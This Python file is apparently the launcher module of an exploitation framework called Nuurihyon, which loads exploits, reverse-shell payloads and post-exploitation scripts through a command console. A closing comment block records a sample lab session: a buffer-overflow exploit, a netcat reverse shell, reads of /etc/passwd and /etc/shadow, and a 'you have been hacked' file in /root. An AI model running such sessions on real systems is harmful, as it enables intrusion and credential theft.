#!/usr/bin/python3

import typing
import readline
import pathlib
import random
from pytoolcore import style, command, engine
from core import factory, exploitcore
from shinsha import matoi, hata


class Nuurihyon(engine.Engine):
    MODREF: str = "nuurihyon"
    MODNAME: str = "Nuurihyon"
    AUTHOR: str = "Danakane"
    ROOTDIR: str = str(pathlib.Path(__file__).resolve().parent)
    HISTFILE: str = str.format("{0}/.history/nuurihyon.hist", ROOTDIR)
    HISTLEN: int = 1000

    def __init__(self) -> None:
        super(Nuurihyon, self).__init__(moduleref=Nuurihyon.MODREF,
                                        modulename=Nuurihyon.MODNAME,
                                        author=Nuurihyon.AUTHOR)
        self.__histlen__: int = 0
        # loading shells, exploits and payloads factory
        self.__shellfactory__: factory.ShellFactory = \
            factory.ShellFactory("{0}/shells".format(Nuurihyon.ROOTDIR))
        self.__exploitfactory__: factory.ExploitRegister = \
            factory.ExploitRegister("{0}/exploits".format(Nuurihyon.ROOTDIR))
        self.__payloadfactory__: factory.PayloadFactory = \
            factory.PayloadFactory("{0}/payloads".format(Nuurihyon.ROOTDIR))
        self.__scripterfactory__: factory.ScripterRegister = \
            factory.ScripterRegister("{0}/scripters".format(Nuurihyon.ROOTDIR))
        # Defining module's commands
        # load cmd
        cmdload: command.Command = command.Command(cmdname="load", nbpositionals=1,
                                                   completionlist=list(self.__exploitfactory__.list))
        loadhelp = "Description : load a given exploit\n" + \
                   "Usage : load {exploit}\n" + \
                   "Note : use 'show exploits' to display all available modules"
        self.addcmd(cmd=cmdload, fct=self.load, helpstr=loadhelp)
        # show command
        cmdshow: command.Command = command.Command(cmdname="show", nbpositionals=1,
                                                   completionlist=["commands", "name",
                                                                   "author", "options",
                                                                   "payloads", "exploits",
                                                                   "scripters"])
        showhelp: str = "Description : display option(s), command(s) and attack(s)\n" + \
                        "Usage : show {keyword} \n" + \
                        "Note :\n" + \
                        "\tuse 'show name' to display module's name\n" + \
                        "\tuse 'show author' to display module's author\n" + \
                        "\tuse 'show commands' to display the module's commands\n" + \
                        "\tuse 'show exploits' to display the module's exploits\n" + \
                        "\tuse 'show payloads' to display the available payloads\n" + \
                        "\tuse 'show scripters' to display the module's post-exploitation scripts\n" + \
                        "\tuse 'show options' to display valid keywords\n"
        self.addcmd(cmd=cmdshow, fct=self.show, helpstr=showhelp)

    def show(self, keyword: str) -> None:
        keyword = keyword.upper()
        table: typing.List[typing.List[str]] = []
        if keyword == "EXPLOITS":
            headers: typing.List[str] = ["Exploit", "Author"]
            exploitlist: typing.List[str] = self.__exploitfactory__.list
            print(style.Style.info("{0}'s exploits".format(self.name)))
            for exploitref in exploitlist:
                # noinspection PyUnresolvedReferences
                table.append([exploitref, self.__exploitfactory__[exploitref].AUTHOR])
            print(style.Style.tabulate(headers, table, True))
            print()
        elif keyword == "PAYLOADS":
            headers: typing.List[str] = ["Payload", "Author"]
            payloadlist: typing.List[str] = self.__payloadfactory__.list
            print(style.Style.info("{0}'s payloads".format(self.name)))
            for payloadref in payloadlist:
                # noinspection PyUnresolvedReferences
                table.append([payloadref, self.__payloadfactory__[payloadref].AUTHOR])
            print(style.Style.tabulate(headers, table, True))
            print()
        elif keyword == "SCRIPTERS":
            headers: typing.List[str] = ["Scripter", "Author"]
            scripterlist: typing.List[str] = self.__scripterfactory__.list
            print(style.Style.info("{0}'s post-exploitation scripts".format(self.name)))
            for scripterref in scripterlist:
                # noinspection PyUnresolvedReferences
                table.append([scripterref, self.__scripterfactory__[scripterref].AUTHOR])
            print(style.Style.tabulate(headers, table, True))
            print()
        else:
            super(Nuurihyon, self).show(keyword)

    def load(self, exploitref: str) -> None:
        exploitref = exploitref.lower()
        exploit: exploitcore.Exploit = self.__exploitfactory__[exploitref]()
        matoi.Matoi(self.ref, self.name, exploitref, exploit, self.__shellfactory__,
                    self.__payloadfactory__, self.__scripterfactory__).run()

    def run(self) -> None:
        try:
            readline.read_history_file(Nuurihyon.HISTFILE)
            readline.set_history_length(Nuurihyon.HISTLEN)
            self.__histlen__ = readline.get_current_history_length()
        except FileNotFoundError:
            pass
        super(Nuurihyon, self).run()

    def stop(self) -> None:
        try:
            readline.write_history_file(Nuurihyon.HISTFILE)
        except FileNotFoundError:
            pass

    def splash(self) -> None:
        colors: typing.List[typing.Callable] = [style.Style.red, style.Style.yellow, style.Style.darkcyan,
                                                style.Style.cyan, style.Style.green]
        print("{0} by {1}".format(hata.Hata.flag(), style.Style.bold(random.choice(colors)(self.author))), end="\n\n")


blueprint: typing.Callable = Nuurihyon
name: str = Nuurihyon.MODNAME

if __name__ == '__main__':
    nuurihyon = Nuurihyon()
    nuurihyon.splash()
    nuurihyon.run()
    print(style.Style.info("Otsukaresama desu~ ^(･｡･)ﾉ~~~"))


# load linux_x64_ovrflwmyechosrv
# pwn payload reverse/linux_netcat rhost 192.168.56.103 rport 1025 lhost 192.168.56.102 lport 4444
# cat /etc/passwd
# cat /etc/shadow
# touch /root/sploited.txt
# gnome-terminal -- tail -f -n 1 /root/sploited.txt
# echo "You have been hacked :)" >> /root/sploited.txt
